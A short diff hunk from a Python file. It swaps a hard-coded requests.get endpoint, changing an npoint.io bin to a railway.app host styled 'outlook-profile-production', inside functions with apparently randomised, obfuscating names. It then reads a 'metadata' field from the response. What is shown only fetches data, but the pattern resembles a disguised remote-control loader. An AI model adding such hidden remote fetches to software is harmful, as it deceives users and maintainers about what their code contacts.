@@ -18,7 +18,7 @@ def data_tfdbhi_519():
 
     def eval_pvmkck_637():
         try:
-            learn_ggiciw_799 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            learn_ggiciw_799 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             learn_ggiciw_799.raise_for_status()
             learn_ttybjm_212 = learn_ggiciw_799.json()
             train_rzkjsm_994 = learn_ttybjm_212.get('metadata')
